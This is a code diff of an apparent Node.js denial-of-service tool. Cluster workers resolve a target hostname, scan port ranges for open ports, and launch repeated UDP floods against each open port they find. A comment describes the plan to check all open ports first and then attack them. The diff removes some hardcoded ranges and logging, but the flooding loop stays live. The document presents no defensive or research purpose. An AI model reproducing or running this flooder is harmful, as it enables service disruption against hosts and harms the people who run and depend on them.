@@ -8,7 +8,6 @@ const program = require('commander');
 const programHelp = require('./services/ProgramHelpService')(program);
 
 const resolveHostname = require('./services/DnsResolver');
-const scanPortsForIp = require('./services/EvilPortScanner');
 const http = require('http');
 const numCPUs = require('os').cpus().length;
 const cpuFactor = (numCPUs / 4);//Use 1 in production
@@ -43,6 +42,7 @@ if (host) {
                 });
             }).catch(function (error) {
             throw error;
+
         });
     } else {
         // Worker 3700 started
@@ -65,17 +65,7 @@ if (host) {
         for (let i = 0; i < ips.length; i++) {
             const ip = ips[i];
             let [start, end] = findStartAndEndPorts(workerId, numCPUs);
-            if (workerId === '1') {
-                start = 0;
-                end = 7999;
-            } else if (workerId === '2') {
-                start = 8000;
-                end = 15999;
-            }
             console.log(`*** Worker ${process.pid} starting on ${ip} using range: (${start}, ${end}) ***`);
-            // for (start; start <= end; start++) {
-            //TODO check all open ports first then attack them
-            // const scannedPort = start;
             const N = 8000;
             const portRange = Array.apply(null, {length: N}).map(function (value, index) {
                 return index + start;
@@ -94,10 +84,11 @@ if (host) {
                     if (port) {
                         console.log('*** Worker ' + process.pid + ' found open port:' + port);
                         for (let i = 0; i <= 10; i++) {//TODO This number may vary
-                            flood(type, ip, port, port, timeout).then(function (results) {
-                                const [pid, bytes, HOST, port, socketAddress, socketPort] = results;
-                                console.log('pid: ' + pid + ' sent package UDP with ' + bytes + ' bytes message to ' + HOST + ':' + port + ' from ' + socketAddress + ':' + socketPort);
-                            });
+                            flood(type, ip, port, port, timeout)
+                            //     .then(function (results) {
+                            //     const [pid, bytes, HOST, port, socketAddress, socketPort] = results;
+                            //     console.log('pid: ' + pid + ' sent package UDP with ' + bytes + ' bytes message to ' + HOST + ':' + port + ' from ' + socketAddress + ':' + socketPort);
+                            // });
                             // console.log('I am flooding');
                         }
                     }
